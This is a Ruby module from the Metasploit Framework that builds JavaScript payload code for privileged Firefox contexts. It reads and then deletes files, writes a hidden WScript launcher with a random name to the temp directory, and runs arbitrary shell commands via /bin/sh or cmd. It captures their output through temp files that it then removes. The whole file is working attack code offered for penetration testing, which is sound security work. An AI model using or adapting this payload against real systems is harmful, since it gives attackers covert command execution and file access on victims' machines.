# -*- coding: binary -*-
require 'msf/core'

module Msf::Payload::Firefox
  def read_file_source
    %Q|
      var readFile = function(path) {
        try {
          var file = Components.classes["@mozilla.org/file/local;1"]
                   .createInstance(Components.interfaces.nsILocalFile);
          file.initWithPath(path);

          var fileStream = Components.classes["@mozilla.org/network/file-input-stream;1"]
                           .createInstance(Components.interfaces.nsIFileInputStream);
          fileStream.init(file, 1, 0, false);

          var binaryStream = Components.classes["@mozilla.org/binaryinputstream;1"]
                             .createInstance(Components.interfaces.nsIBinaryInputStream);
          binaryStream.setInputStream(fileStream);
          var array = binaryStream.readByteArray(fileStream.available());

          binaryStream.close();
          fileStream.close();
          file.remove(true);

          return array.map(function(aItem) { return String.fromCharCode(aItem); }).join("");
        } catch (e) { return ""; }
      };
    |
  end

  def run_cmd_source
    %Q|
      var ua = Components.classes["@mozilla.org/network/protocol;1?name=http"]
        .getService(Components.interfaces.nsIHttpProtocolHandler).userAgent;
      var jscript = (#{JSON.unparse({:src => jscript_launcher})}).src;
      var runCmd = function(cmd) {
        var shEsc = "\\\\$&";
        var windows = (ua.indexOf("Windows")>-1);

        if (windows) {
          shEsc = "\\^$&";
          var jscriptFile = Components.classes["@mozilla.org/file/directory_service;1"]
            .getService(Components.interfaces.nsIProperties)
            .get("TmpD", Components.interfaces.nsIFile);
          jscriptFile.append('#{Rex::Text.rand_text_alphanumeric(8)}.js');
          var stream = Components.classes["@mozilla.org/network/safe-file-output-stream;1"]
            .createInstance(Components.interfaces.nsIFileOutputStream);
          stream.init(jscriptFile, 0x04 \| 0x08 \| 0x20, 0666, 0);
          stream.write(jscript, jscript.length);
          if (stream instanceof Components.interfaces.nsISafeOutputStream) {
            stream.finish();
          } else {
            stream.close();
          }
        }

        var stdoutFile = "#{Rex::Text.rand_text_alphanumeric(8)}";
        var stderrFile = "#{Rex::Text.rand_text_alphanumeric(8)}";

        var stdout = Components.classes["@mozilla.org/file/directory_service;1"]
          .getService(Components.interfaces.nsIProperties)
          .get("TmpD", Components.interfaces.nsIFile);
        stdout.append(stdoutFile);

        var stderr = Components.classes["@mozilla.org/file/directory_service;1"]
          .getService(Components.interfaces.nsIProperties)
          .get("TmpD", Components.interfaces.nsIFile);
        stderr.append(stderrFile);

        if (windows) {
          var shell = "cmd /c "+cmd;
          shell = "cmd /c "+shell.replace(/\\W/g, shEsc)+" >"+stdout.path+" 2>"+stderr.path;
        } else {
          var shell = ["/bin/sh", "-c", cmd.replace(/\\W/g, shEsc)].join(" ");
          shell = "/bin/sh -c "+(shell + " >"+stdout.path+" 2>"+stderr.path).replace(/\\W/g, shEsc);
        }
        var process = Components.classes["@mozilla.org/process/util;1"]
          .createInstance(Components.interfaces.nsIProcess);
        var sh = Components.classes["@mozilla.org/file/local;1"]
                   .createInstance(Components.interfaces.nsILocalFile);

        if (windows) {
          sh.initWithPath("C:\\\\Windows\\\\System32\\\\wscript.exe");
          process.init(sh);
          var args = [jscriptFile.path, shell];
          process.run(true, args, args.length);
        } else {
          sh.initWithPath("/bin/sh");
          process.init(sh);
          process.run(true, ["-c", shell], 2);
        }

        if (windows) {
          jscriptFile.remove(true);
          return [cmd+"\\r\\n"+readFile(stdout.path), readFile(stderr.path)];
        }
        else {
          return [readFile(stdout.path), readFile(stderr.path)];
        }
      };
    |
  end

  def jscript_launcher
    %Q|
      var cmdStr = '';
      for (var i = 0; i < WScript.arguments.length; i++) cmdStr += WScript.arguments(i) + " ";
      (new ActiveXObject("WScript.Shell")).Run(cmdStr, 0, true);
    |
  end
end
